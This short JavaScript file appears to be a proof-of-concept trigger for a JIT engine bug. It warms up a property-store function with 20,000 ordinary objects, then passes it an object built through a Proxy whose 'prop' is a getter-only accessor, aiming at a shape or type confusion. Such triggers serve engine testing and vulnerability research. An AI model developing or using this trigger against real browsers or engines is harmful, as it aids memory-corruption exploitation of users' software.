let trigger_phase = false;

function VulnerableTarget() {
  if (trigger_phase) {
    Object.defineProperty(this, 'prop', {
      get: () => 0,
    });
    return;
  }
  this.prop = 1;
}

const P = new Proxy(VulnerableTarget, {
  construct(target, args) {
    trigger_phase = true;
    return Reflect.construct(target, args);
  }
});

function jit_func(o) {
  o.prop = 1.1;
}

for (let i = 0; i < 20000; i++) {
  let obj = new VulnerableTarget();
  jit_func(obj);
}

let trigger_obj = new P();
jit_func(trigger_obj);